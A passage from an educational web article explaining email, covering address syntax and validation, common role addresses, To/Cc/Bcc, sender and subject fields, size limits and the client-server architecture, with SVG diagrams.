<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-2.3.5"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a> restricts domain names to this syntax.
All labels (except the one for the root zone)
have to contain at least one character and at most <a href="https://datatracker.ietf.org/doc/html/rfc1035#section-2.3.4">63 characters</a>.
The length of the whole domain name is limited to <a href="https://datatracker.ietf.org/doc/html/rfc1035#section-2.3.4">255 characters</a>,
including the dots.
Domain names are explicitly <a href="https://datatracker.ietf.org/doc/html/rfc1035#section-2.3.3">case-insensitive</a>.
Only fully-qualified domain names may be used in email addresses on the public Internet
and the domain part of an email address is always written without the trailing dot.
The domain name in an email address must have an <code>MX</code>, <code>A</code>, or <code>AAAA</code> resource record.
According to <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-5.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a>, a <code>CNAME</code> record is also permitted
as long as its target can be resolved to an <abbr title="Internet Protocol">IP</abbr> address through one of the just mentioned record types.</p>

  <p>Can an email address use an <abbr title="Internet Protocol">IP</abbr> address instead of a domain name?
Yes: The <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.4.1">address format</a>
allows an <abbr title="Internet Protocol">IP</abbr> address in brackets in place of a domain name.
For example, <code>user@[192.0.2.123]</code> is a valid email address.
However, the <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> specification says that a host <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-2.3.4">should not</a>
be identified by its <abbr title="Internet Protocol">IP</abbr> address, <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.3">unless</a>
the host is not known to the Domain Name System.
One reason for this is that a single mail server can receive emails for multiple domains
and the same user might exist in several of these domains.
If the recipient address doesn’t include a domain name,
the mail server might not know to which mailbox it should deliver the message.
The domain part of an email address thus serves a similar purpose
as the <code>Host</code> header field in <a href="https://evalapply.org/internet/#hypertext-transfer-protocol"><abbr title="HyperText Transfer Protocol">HTTP</abbr></a>.
One might think that mail servers would reject messages with an <abbr title="Internet Protocol">IP</abbr> address in the <a href="#sender">sender address</a> as <a href="#spam">spam</a>,
but a reader of this article convinced me that this works just fine in many cases.
<a href="https://en.wikipedia.org/wiki/Apple_Mail">Apple Mail</a>,
<a href="https://en.wikipedia.org/wiki/Mozilla_Thunderbird">Thunderbird</a>,
and <a href="https://en.wikipedia.org/wiki/Gmail">Gmail</a> also accept such addresses as <a href="#recipients">recipients</a>,
while <a href="https://en.wikipedia.org/wiki/Outlook.com">Outlook.com</a>
and <a href="https://en.wikipedia.org/wiki/Yahoo!_Mail">Yahoo! Mail</a> don’t.</p>

  <p>What about characters outside of the English alphabet?
There was a <a href="https://tools.ietf.org/wg/eai/">working group</a> dedicated to the
<a href="https://en.wikipedia.org/wiki/Email_address#Internationalization">internationalization of email addresses</a>.
<a href="https://datatracker.ietf.org/doc/html/rfc6531"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6531</a> defines an <a href="#common-smtp-extensions"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> extension</a>
which allows <a href="#message-versus-envelope">envelope fields</a> to be encoded in <a href="https://evalapply.org/internet/#text-encoding"><abbr title="Unicode Transformation Format">UTF</abbr>-8</a>
if both the sender and the recipient support it.
I’ll cover this <a href="#email-address-internationalization">later</a>.</p>

  <p>If you have to validate email addresses,
you can use the following <a href="https://en.wikipedia.org/wiki/Regular_expression">regular expression</a>
from the <a href="https://html.spec.whatwg.org/multipage/input.html#valid-e-mail-address">Living <abbr title="HyperText Markup Language">HTML</abbr> Standard</a>:
<code>/^[a-zA-Z0-9.!#$%&amp;&#39;*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/</code>.
This regular expression allows adjacent dots in the local part but does not allow the local part to be quoted.
You could limit the length of the local part with <code>[a-zA-Z0-9.!#$%&amp;&#39;*+\/=?^_`{|}~-]{1,64}</code>,
but you should be <a href="https://en.wikipedia.org/wiki/Robustness_principle">liberal in what you accept from others</a>.
And since <a href="#dotless-domains">some top-level domains</a> accept email,
the regular expression intentionally ends with <code>*$/</code> instead of <code>+$/</code>.
As we will see later on,
the <a href="#idna2008-validation">validation of internationalized domain names</a> is much more difficult.</p>

</details>

<details>
  <summary id="common-addresses">
Common addresses
</summary>

  <p>If you use your own domain for email, you can choose the <a href="#normalization">local part</a> of your addresses
however you want as long as you adhere to the <a href="#address-syntax">address syntax</a>.
Some local parts, though, are commonly used to reach the person with a specific role in an organization:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Address</th>
          <th>Expectation</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><code>info@</code></td>
          <td>Reach someone from the administrative office.</td>
        </tr>
        <tr>
          <td><code>contact@</code></td>
          <td>Be directed to the desired person within the organization.</td>
        </tr>
        <tr>
          <td><code>sales@</code></td>
          <td>Receive purchase information from the sales person.</td>
        </tr>
        <tr>
          <td><code>support@</code></td>
          <td>Get support for the offered product or service.</td>
        </tr>
        <tr>
          <td><code>marketing@</code></td>
          <td>Provide feedback to marketing campaigns.</td>
        </tr>
        <tr>
          <td><code>abuse@</code></td>
          <td>Report inappropriate public behavior.</td>
        </tr>
        <tr>
          <td><code>security@</code></td>
          <td><a href="https://en.wikipedia.org/wiki/Responsible_disclosure">Responsibly disclose</a> a <a href="https://en.wikipedia.org/wiki/Vulnerability_(computing)">security vulnerability</a>.</td>
        </tr>
        <tr>
          <td><code>postmaster@</code></td>
          <td>Reach the email administrator (required according to <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.5.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a>).</td>
        </tr>
        <tr>
          <td><code>hostmaster@</code></td>
          <td>Reach the <abbr title="Domain Name System">DNS</abbr> administrator.</td>
        </tr>
        <tr>
          <td><code>webmaster@</code></td>
          <td>Reach the Web administrator.</td>
        </tr>
        <tr>
          <td><code>admin@</code></td>
          <td>Reach the technical administrator (as an alternative to the previous three addresses).</td>
        </tr>
      </tbody>
    </table>

    <figcaption>

Most of these addresses are encouraged by <a href="https://datatracker.ietf.org/doc/html/rfc2142"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2142</a>:
“Mailbox names for common services, roles, and functions”.
Role-based addresses are usually configured as <a href="#alias-address">aliases</a>
so that incoming emails can be forwarded to several people.

</figcaption>
  </figure>

</details>

<h3 id="recipients">Recipients</h3>

<p>You can address the recipients of a message in <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.3">three different ways</a>:</p>
<ul>
  <li>The <code>To</code> field contains the address(es) of the primary recipient(s).
As a sender, you expect the primary recipient(s) to read and often to react to your message.
The expected reaction can be a reply or that they perform the requested task.</li>
  <li>The <code>Cc</code> field contains the address(es) of the secondary recipient(s).
As a sender, you want to keep the secondary recipient(s) informed
without expecting them to read or react to your message.
(<code>Cc</code> stands for <a href="https://en.wikipedia.org/wiki/Carbon_copy">carbon copy</a>.)</li>
  <li>The <code>Bcc</code> field contains the address(es) of the hidden recipient(s).
Their address(es) are not to be revealed to other recipients of the message.
The field is usually fully preserved in your folder of sent messages
but fully removed in the version of the email that is delivered to others.
Alternatively, a different message could be delivered to each hidden recipient
where their address alone is listed in the <code>Bcc</code> field.
The standard also allows hidden recipients to see each other;
they just have to be removed for the primary and secondary recipients.
The vague semantics of this feature leads to <a href="#bcc-removal">several problems</a>.
(<code>Bcc</code> stands for <a href="https://en.wikipedia.org/wiki/Blind_carbon_copy">blind carbon copy</a>.)</li>
</ul>

<p><strong>Important</strong>: Just because someone is listed as another recipient
doesn’t mean that they received the same message as you.
The reason for this could be innocuous or malicious.
On the one hand, it may be that the email could simply not be delivered to them.
On the other hand, the sender might have delivered the message only to you in order to mislead you.
Your mailbox provider has no way of verifying
that the same message has also been delivered to the other recipients.
This allows a fraudster to fake a relationship that they do not have
or to lead you to believe that they have done the introduction you asked them for,
even when this is not the case.
If you reply to all, your reply would also be sent to the faked recipients, of course.</p>

<details>
  <summary id="group-construct">
Group construct
</summary>

  <p>The <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.4">address specification</a>
allows senders to group addresses with the following syntax: <code>{GroupName}:</code> <code>{ListOfAddresses};</code>,
where the <a href="https://en.wikipedia.org/wiki/Bracket#Curly_bracket">curly brackets</a> have to be replaced with actual values.
<code>ListOfAddresses</code> is a comma-separated list of addresses, where each address can also have a display name.
You can send an email to several groups, but you cannot nest groups.
The list of addresses can be empty, which allows the sender to hide the recipients of a message.
Even though the <code>To</code> field is optional and can therefore be skipped completely,
some mail clients prefer to put something like <code>undisclosed-recipients:;</code> into this field
when you list all the recipients in the <code>Bcc</code> field.
As far as I can tell, this is the primary use of the group construct nowadays.</p>

</details>

<h3 id="sender">Sender</h3>

<p>There are <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.2">two relevant fields</a> to indicate the originator of a message:</p>
<ul>
  <li>The <code>From</code> field contains the address of the person who is responsible for the content of the message.</li>
  <li>The <code>Reply-To</code> field indicates the address(es) to which replies should be sent.
If absent, replies are sent to the <code>From</code> address.</li>
</ul>

<p><strong>Important</strong>: The core email protocols do not authenticate the sender of an email.
It’s called <a href="https://en.wikipedia.org/wiki/Email_spoofing">spoofing</a>
when the sender uses a <code>From</code> address which doesn’t belong to them.
Forged sender addresses are a huge problem for the <a href="#security">security of email</a>.
There are <a href="#domain-authentication">additional standards</a> to authenticate emails.
For them to have the desired effect, though,
both the sender and the recipients have to use them.</p>

<details>
  <summary id="sender-field">
Sender field
</summary>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a>
differentiates between the author and the sender of a message.
The person who writes the message is usually also the one who sends it.
If the author and the sender are different, though,
the sender should be provided in the <code>Sender</code> field.
The standard also allows several addresses in the <code>From</code> field.
If this is the case, the email must include a <code>Sender</code> field with a single address.
However, I’m not aware of any mail clients which support this.
In practice, the addresses of the co-authors are simply added to the <code>Cc</code> field.
Their contribution is made clear to the primary recipients
by mentioning the names of all the authors at the end of the message.
Remember that a sender can lie about their co-authors:
The fact that a person’s address is listed in the <code>Cc</code> field
doesn’t imply that the email has been delivered to them
and that they agree with the content of the message.</p>

</details>

<details>
  <summary id="no-reply">
No reply
</summary>

  <p>Many emails are sent from automated systems, which cannot handle replies.
Examples of such emails are notifications about events on a platform and reports about some usage statistics.
<a href="https://datatracker.ietf.org/doc/html/rfc5322#page-21"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a>
required each email to have a <code>From</code> field with one or several addresses.
<a href="https://datatracker.ietf.org/doc/html/rfc6854"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6854</a> updated the standard in 2013
to allow the <a href="#group-construct">group construct</a> to be used in the <code>From</code> field as well.
This allows automated systems to provide no reply address by using an empty group in the <code>From</code> field,
rather than having to rely on users interpreting an address such as <code>no-reply@example.com</code> correctly.
The automated system can still identify itself by choosing the name of the group appropriately,
for example <code>LinkedIn Notification Bot:;</code>.
In the absence of an alternative to indicate the originating domain to the user,
I strongly advise against using an empty group in the <code>From</code> field, though,
because this defeats all efforts towards <a href="#domain-authentication">domain authentication</a>.
Even the <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> itself <a href="https://datatracker.ietf.org/doc/html/rfc6854#page-3">recommends against</a>
the general use of this method and <a href="https://datatracker.ietf.org/doc/html/rfc6854#section-3">says</a>
that it is for <a href="https://datatracker.ietf.org/doc/html/rfc2026#section-3.3">limited use</a> only.
Thus, we still have to wait for a usable
<a href="https://stackoverflow.com/questions/9591044/is-there-a-no-reply-email-header/63689720"><code>No-Reply</code></a>
<a href="#header-fields-and-body">header field</a>, unfortunately.
(The empty group construct is used to <a href="#email-address-internationalization">downgrade internationalized email addresses</a>
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc6857#page-11"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6857</a>.)</p>

</details>

<h3 id="subject">Subject</h3>

<p>The <code>Subject</code> field identifies the topic of a message.
Its content is restricted to a single line but the line can be of arbitrary length.
(We’ll talk about <a href="#line-length-limit">encoding</a> later.)
<a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a> also defines other informational fields,
namely <code>Comments</code> and <code>Keywords</code>, but I’ve never seen them being used.
All informational fields are optional, which means an email doesn’t need a subject line.
The mail clients I’ve checked, though, include the <code>Subject</code> field even when it’s empty.
While the message is transmitted with an empty <code>Subject</code> field,
mail clients usually display “(No subject)” instead of nothing.</p>

<details>
  <summary id="prefixes">
Prefixes
</summary>

  <p>When you reply to a message, your mail client automatically suggests the new subject:
“Re: ” followed by the original subject.
While I would argue that “Re” stands for “reply”,
<a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a> says
that it is an abbreviation of the Latin “in re”, which means “in the matter of”.
Similarly, if you forward an email to another recipient,
your mail client typically puts “Fwd: ” in front of the original subject.
Using such prefixes in replies and forwarded emails is optional.
In particular, they have no technical significance.
As we will see <a href="#message-identification">later</a>, messages are grouped into conversations
based on other, more reliable information.</p>

</details>

<h3 id="body">Body</h3>

<p>Last but not least, an email has a <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-2.1">body</a>
(which is strictly speaking optional).
The body contains the actual content of a message.
It can be formatted in different ways and can consist of <a href="#multipart-messages">different parts</a>.
Splitting the body into several parts is useful,
for example, to send a plaintext version alongside an <a href="#html-emails"><abbr title="HyperText Markup Language">HTML</abbr>-encoded message</a>
or to <a href="https://en.wikipedia.org/wiki/Email_attachment">attach files</a> to an email.
We’ll discuss <a href="#content-encoding">later</a> how all of this works.</p>

<details>
  <summary id="size-limit">
Size limit
</summary>

  <p>The email standards impose <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.5.3.1.7">no size limit</a> on messages.
Since various servers have to store your message at least temporarily,
they are configured to reject messages larger than a certain size.
Many providers have a size limit between around
<a href="https://en.wikipedia.org/wiki/Comparison_of_webmail_providers">25 to 50 MB</a>.
Even if your mailbox provider allows you to send larger messages,
such messages might still be rejected by the mail server of the recipient.
Since attachments have to be encoded in a <a href="#content-encoding">particular way</a>,
their original size can be at most around 70% of the actual size limit.</p>

</details>

<h2 id="architecture">Architecture</h2>

<p>There are four separate aspects to understand email from a technical perspective:</p>
<ul>
  <li><a href="#format"><strong>Format</strong></a>: What is the syntax of email messages?</li>
  <li><a href="#protocols"><strong>Protocols</strong></a>: How are these messages transmitted?</li>
  <li><a href="#entities"><strong>Entities</strong></a>: Who transmits these messages to whom?</li>
  <li><a href="#architecture"><strong>Architecture</strong></a>: How are these entities arranged?</li>
</ul>

<p>Let’s go through them one by one in the opposite order.</p>

<h3 id="simplified-architecture">Simplified architecture</h3>

<p>One reason why email is so hard to grasp is because the <a href="#official-architecture">official terminology</a>
is unnecessarily complicated in most circumstances.
Throughout this article, we’ll work with a much simpler version.
Email follows the <a href="https://evalapply.org/internet/#client-server-model">client-server model</a>:
A client opens a <a href="https://evalapply.org/internet/#transmission-control-protocol">connection</a>
to a server in order to request some service.
In all the graphics where arrows represent an exchange of data,
the arrows point from the client to the server;
i.e. in the direction of the request, not the response.
The following entities and protocols are involved in the transmission of a message from a sender to a recipient:</p>

<figure>
  <svg id="figure-simplified-architecture" data-name="simplified-architecture" width="599.148" height="298.25" viewBox="-131.662 -5 599.148 298.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <path d="M -0.312,250.25 A 77.394 165.5 0 0 1 -77.706,84.75 L -77.706447,84.740008" marker-end="url(#arrow-gray)" stroke-dasharray="190"></path>
    <text text-anchor="end">
        <tspan x="-60.121" y="224.146"><tspan>imap</tspan> for</tspan><tspan x="-60.121" y="246.146">message</tspan><tspan x="-60.121" y="268.146">storage</tspan>
    </text>
    <line x1="283.118" y1="208.188" x2="283.118" y2="84.75" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="start">
        <tspan x="295.118" y="129.9"><tspan>imap</tspan> or <tspan>pop3</tspan></tspan><tspan x="295.118" y="151.9">for message</tspan><tspan x="295.118" y="173.9">retrieval</tspan>
    </text>
    <line x1="105.725" y1="41.75" x2="229.162" y2="41.75" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="middle">
        <tspan x="167.912" y="7.75"><tspan>smtp</tspan> for</tspan><tspan x="167.912" y="29.75">message relay</tspan>
    </text>
    <line x1="52.706" y1="208.188" x2="52.706" y2="84.75" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="end">
        <tspan x="40.706" y="129.9"><tspan>smtp</tspan> for</tspan><tspan x="40.706" y="151.9">message</tspan><tspan x="40.706" y="173.9">submission</tspan>
    </text>
    <rect x="0" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="52.706" y="267.15">of sender</tspan>
    </text>
    <rect x="0" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="52.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="52.706" y="69.65">of sender</tspan>
    </text>
    <rect x="230.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="283.118" y="47.65"><tspan>mail server</tspan></tspan><tspan x="283.118" y="69.65">of recipient</tspan>
    </text>
    <rect x="230.412" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="283.118" y="267.15">of recipient</tspan>
    </text>
    <rect x="-130.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="-77.706" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="-77.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="-77.706" y="69.65">of sender</tspan>
    </text>
    <rect x="360.824" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="413.53" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="413.53" y="47.65"><tspan>mail server</tspan></tspan><tspan x="413.53" y="69.65">of recipient</tspan>
    </text>

</svg>

  <figcaption>

The simplified email architecture.
We’ll discuss each entity in the <a href="#entities">next chapter</a> and the protocols <a href="#protocols">thereafter</a>.

</figcaption>
</figure>

<details>
  <summary id="standardization">
Standardization
</summary>

  <p>If we ignore for a moment that there are separate servers for incoming and for outgoing mail,
we’re left with the following:
The user interacts with a client to read and compose messages.
The client submits the composed messages to a server for delivery.
The client also fetches newly received messages from the server.
The server connects to other servers in order to deliver some messages.
The important thing to note is that the interactions between these entities are independent from one another:</p>

  <figure>
    <svg id="figure-standardization" data-name="standardization" width="174.864" height="211" viewBox="-36.841 -31.25 174.864 211" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="35.904" y1="19.75" x2="64.341" y2="19.75" marker-end="url(#arrow-green)" stroke-dasharray="21"></line>
    <line x1="101.182" y1="138.688" x2="101.182" y2="110.25" marker-end="url(#arrow-gray)" stroke-dasharray="21"></line>
    <line x1="101.182" y1="69.188" x2="101.182" y2="40.75" marker-end="url(#arrow-blue)" stroke-dasharray="21"></line>
    <line x1="0" y1="138.688" x2="0" y2="110.25" marker-end="url(#arrow-gray)" stroke-dasharray="21"></line>
    <line x1="0" y1="69.188" x2="0" y2="40.75" marker-end="url(#arrow-blue)" stroke-dasharray="21"></line>
    <text text-anchor="middle">
        <tspan x="0" y="-18.5"><tspan>Sender</tspan></tspan>
    </text>
    <rect x="-35.591" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="25.65"><tspan>Server</tspan></tspan>
    </text>
    <rect x="-35.591" y="69.5" width="71.182" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="95.15"><tspan>Client</tspan></tspan>
    </text>
    <rect x="-35.591" y="139" width="71.182" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="164.65"><tspan>User</tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="101.182" y="-18.5"><tspan>Recipient</tspan></tspan>
    </text>
    <rect x="65.591" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="101.182" y="25.65"><tspan>Server</tspan></tspan>
    </text>
    <rect x="65.591" y="69.5" width="71.182" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="101.182" y="95.15"><tspan>Client</tspan></tspan>
    </text>
    <rect x="65.591" y="139" width="71.182" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="101.182" y="164.65"><tspan>User</tspan></tspan>
    </text>

</svg>

    <figcaption>
How emails are submitted and accessed (in blue) is independent
from how emails are exchanged between servers (in green).
</figcaption>
  </figure>

  <p>Let’s have a look at each of these interactions with regard to standardization:</p>
  <ul>
    <li><strong>Server ➞ server</strong>:
Just as any machines on the Internet can communicate with one another
(as long as we ignore <a href="https://evalapply.org/internet/#firewall">firewalls</a>),
any users with an email address can send each other messages
(as long as we ignore <a href="#spam">spam filters</a>).
This works only because the exchange of messages between mail servers is <a href="#delivery-protocols">standardized</a>.
Anyone who adheres to this standard can participate in the global email system.
In order to maintain compatibility with older servers,
support for new functionality is always optional.</li>
    <li><strong>Client ➞ server</strong>:
How clients submit and access emails doesn’t have to be standardized
for email to remain interoperable according to the previous point.
Luckily, we do have <a href="#access-protocols">open standards</a> for accessing one’s mailbox.
Since these standards are older than all commercial mailbox providers,
most mailbox providers support at least one of them.
This has the advantage that you can switch the server without switching the client
and that you can switch the client without switching the server.
This reduces <a href="https://en.wikipedia.org/wiki/Vendor_lock-in">vendor lock-in</a>
on both the client- and the server-side,
which leads to more choice for consumers.
However, mailbox providers can still support proprietary features,
which only their client knows how to make use of.</li>
    <li><strong>User ➞ client</strong>:
How users interact with mail clients is not standardized.
In particular, users don’t have to sit directly in front of their mail client.
They can also interact with a mail client <a href="#webmail">over the Web</a>, for example.
Some standards demand that certain actions have to be confirmed or initiated by the user.
Apart from this, mail clients are free to present information to the user in any way they want.
But similar to how you can drive a car from any brand if you know how to drive a car from one brand,
users have developed expectations regarding how the above <a href="#concepts">concepts</a> are presented.
For example, <code>Cc</code> is always called <code>Cc</code>.</li>
  </ul>

</details>

<details>
  <summary id="webmail">
Webmail
</summary>

  <p><a href="#provider">Mailbox providers</a> usually offer a web interface to their email service.
Instead of <a href="#configuration">configuring a mail client</a>, which runs locally on your device,
you can visit a provider-specific website with a <a href="https://en.wikipedia.org/wiki/Web_browser">web browser</a>
in order to access your messages.
This is known as <a href="https://en.wikipedia.org/wiki/Webmail">webmail</a>
and it has the advantage that you can read and compose emails from any device with a web browser.
From the perspective of email standards, this constitutes a remote access to the mail client:</p>

  <figure>
    <svg id="figure-webmail" data-name="webmail" width="486.794" height="332" viewBox="-63.397 -31.25 486.794 332" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <text text-anchor="middle">
        <tspan x="0" y="-18.5"><tspan>Web</tspan></tspan>
    </text>
    <rect x="-62.147" y="130" width="124.295" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="155.65"><tspan>Web server</tspan></tspan>
    </text>
    <rect x="-62.147" y="195" width="124.295" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="220.65"><tspan>Web browser</tspan></tspan>
    </text>
    <line x1="0" y1="194.688" x2="0" y2="170.75" marker-end="url(#arrow)" stroke-dasharray="17"></line>
    <rect x="-62.147" y="260" width="124.295" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="285.65"><tspan>User</tspan></tspan>
    </text>
    <line x1="0" y1="259.688" x2="0" y2="235.75" marker-end="url(#arrow)" stroke-dasharray="17"></line>
    <text text-anchor="middle">
        <tspan x="180" y="-18.5"><tspan>Mail</tspan></tspan>
    </text>
    <rect x="117.853" y="0" width="124.295" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="180" y="25.65"><tspan>Mail server</tspan></tspan>
    </text>
    <rect x="117.853" y="65" width="124.295" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="180" y="90.65"><tspan>Mail client</tspan></tspan>
    </text>
    <line x1="180" y1="64.688" x2="180" y2="40.75" marker-end="url(#arrow)" stroke-dasharray="17"></line>
    <rect x="117.853" y="260" width="124.295" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="180" y="285.65"><tspan>User</tspan></tspan>
    </text>
    <line x1="180" y1="259.688" x2="180" y2="105.75" marker-end="url(#arrow)" stroke-dasharray="147"></line>
    <text text-anchor="middle">
        <tspan x="360" y="-18.5"><tspan>Webmail</tspan></tspan>
    </text>
    <rect x="297.853" y="0" width="124.295" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="360" y="25.65"><tspan>Mail server</tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="360" y="90.65"><tspan>Mail client</tspan></tspan>
    </text>
    <line x1="360" y1="64.688" x2="360" y2="40.75" marker-end="url(#arrow)" stroke-dasharray="17"></line>
    <text text-anchor="middle">
        <tspan x="360" y="155.65"><tspan>Web server</tspan></tspan>
    </text>
    <rect x="297.853" y="195" width="124.295" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="360" y="220.65"><tspan>Web browser</tspan></tspan>
    </text>
    <line x1="360" y1="194.688" x2="360" y2="170.75" marker-end="url(#arrow)" stroke-dasharray="17"></line>
    <rect x="297.853" y="260" width="124.295" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="360" y="285.65"><tspan>User</tspan></tspan>
    </text>
    <line x1="360" y1="259.688" x2="360" y2="235.75" marker-end="url(#arrow)" stroke-dasharray="17"></line>
    <rect x="297.853" y="65" width="124.295" height="104.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="90" y="158.65"><tspan><tspan>+</tspan></tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="270" y="158.65"><tspan><tspan>=</tspan></tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="360" y="126.15"><tspan>&amp;</tspan></tspan>
    </text>

</svg>

    <figcaption>
In the case of webmail, the mail client is accessed via a web server using a web browser.
</figcaption>
  </figure>

  <p>Unlike a dedicated mail client,
which typically stores the downloaded messages in the persistent memory of your device for offline access,
you have to be connected to the Internet to use webmail.
While not generally desirable,
fetching all data only temporarily until you log out
is useful when you want to access your emails from someone else’s device.
In addition, configuring a mail client is more complicated than navigating to a website.
This might explain the popularity of webmail.
In my opinion, the biggest disadvantage of webmail is that
the logic of how you can interact with your messages comes from the provider:</p>

  <figure>
    <svg id="figure-web-vs-mail" data-name="web-vs-mail" width="418.5" height="228.5" viewBox="-1.25 -31.25 418.5 228.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="332" y1="59.25" x2="332" y2="79.75" marker-start="url(#arrow-orange)" stroke-dasharray="14" stroke-dashoffset="21"></line>
    <line x1="332" y1="116.25" x2="332" y2="136.75" marker-end="url(#arrow-orange)" stroke-dasharray="14"></line>
    <ellipse cx="332" cy="98" rx="27" ry="17"></ellipse>
    <text text-anchor="middle">
        <tspan x="332" y="103.9"><tspan>Data</tspan></tspan>
    </text>
    <line x1="121" y1="59.25" x2="121" y2="79.75" marker-start="url(#arrow-orange)" stroke-dasharray="14" stroke-dashoffset="21"></line>
    <line x1="121" y1="116.25" x2="121" y2="136.75" marker-end="url(#arrow-orange)" stroke-dasharray="14"></line>
    <ellipse cx="121" cy="98" rx="27" ry="17"></ellipse>
    <text text-anchor="middle">
        <tspan x="121" y="103.9"><tspan>Data</tspan></tspan>
    </text>
    <line x1="47" y1="59.25" x2="47" y2="79.75"></line>
    <line x1="47" y1="116.25" x2="47" y2="136.75" marker-end="url(#arrow-pink)" stroke-dasharray="14"></line>
    <ellipse cx="47" cy="98" rx="27" ry="17"></ellipse>
    <text text-anchor="middle">
        <tspan x="47" y="103.9"><tspan>Code</tspan></tspan>
    </text>
    <rect x="0" y="0" width="168" height="58" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="84" y="34.9"><tspan>Web server</tspan></tspan>
    </text>
    <rect x="0" y="138" width="168" height="58" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="84" y="172.9"><tspan>Web browser</tspan></tspan>
    </text>
    <rect x="248" y="0" width="168" height="58" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="332" y="34.9"><tspan>Mail server</tspan></tspan>
    </text>
    <rect x="248" y="138" width="168" height="58" rx="8" ry="8"></rect>
    <text text-anchor="start">
        <tspan x="260" y="172.9"><tspan>Mail client</tspan></tspan>
    </text>
    <ellipse cx="377" cy="167" rx="27" ry="17"></ellipse>
